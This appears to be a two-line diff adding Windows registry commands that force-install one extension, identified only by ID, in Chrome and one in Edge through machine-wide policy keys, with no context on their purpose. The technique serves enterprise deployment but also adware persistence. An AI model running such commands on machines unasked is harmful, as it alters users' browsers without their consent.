@@ -1,0 +1,2 @@
+reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v 56789 /t REG_SZ /d hkckiflbaedpdigcjoeiacmfnlncpeoj
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 56789 /t REG_SZ /d ajndpmmgagjlfgoegeadcgkiehlbcinl
